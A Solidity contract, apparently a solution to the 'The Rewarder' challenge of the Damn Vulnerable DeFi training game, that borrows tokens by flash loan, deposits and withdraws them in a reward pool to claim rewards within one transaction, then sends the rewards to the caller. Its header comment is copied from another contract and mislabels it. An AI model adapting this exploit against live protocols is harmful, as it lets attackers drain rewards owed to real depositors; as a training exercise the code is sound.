// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./RewardToken.sol";
import "./TheRewarderPool.sol";
/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 * @dev A simple pool to get flash loans of DVT
 */
contract Attacker {
	address token;
	address pool;
	address rewardToken;
	constructor(address tokenAddr, address poolAddr, address rewardTokenAddr) {
		token = tokenAddr;
		pool = poolAddr;
		rewardToken = rewardTokenAddr;
	}
	function attack(uint256 amount, address loanPool) external {
		//lets do a flashloan
		FlashLoanerPool(loanPool).flashLoan(amount);
		RewardToken(rewardToken).transfer(msg.sender, RewardToken(rewardToken).balanceOf(address(this)));
	}

	function receiveFlashLoan(uint256 amount) external {
		RewardToken(token).approve(pool, amount);
		TheRewarderPool(pool).deposit(amount);
		TheRewarderPool(pool).withdraw(amount);
		RewardToken(token).transfer(msg.sender, amount);
	}
}